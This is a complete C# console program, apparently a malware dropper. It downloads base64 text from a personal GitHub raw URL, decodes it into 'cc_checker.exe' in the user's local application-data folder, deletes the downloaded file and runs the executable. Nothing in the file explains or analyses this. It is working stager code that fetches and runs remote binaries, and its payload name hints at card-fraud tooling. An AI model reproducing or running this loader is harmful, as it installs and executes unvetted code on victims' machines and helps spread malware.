using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace ConsoleApp1;

internal class Program
{
	public static string p = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static void donon()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://raw.githubusercontent.com/aliali2131998/gtuhn/main/ss.txt", p + "\\bins.txt");
	}

	private static void Main(string[] args)
	{
		Thread thread = new Thread(donon);
		if (File.Exists(p + "\\bins.txt"))
		{
			File.Delete(p + "\\bins.txt");
			thread.Start();
			thread.Join();
			string s = File.ReadAllText(p + "\\bins.txt");
			if (File.Exists(p + "\\cc_checker.exe"))
			{
				File.Delete(p + "\\cc_checker.exe");
				File.WriteAllBytes(p + "\\cc_checker.exe", Convert.FromBase64String(s));
				File.Delete(p + "\\bins.txt");
			}
			Process.Start(p + "\\cc_checker.exe");
		}
		else
		{
			thread.Start();
			thread.Join();
			File.Delete(p + "\\cc_checker.exe");
			string s2 = File.ReadAllText(p + "\\bins.txt");
			File.WriteAllBytes(p + "\\cc_checker.exe", Convert.FromBase64String(s2));
			File.Delete(p + "\\bins.txt");
			Process.Start(p + "\\cc_checker.exe");
		}
	}
}
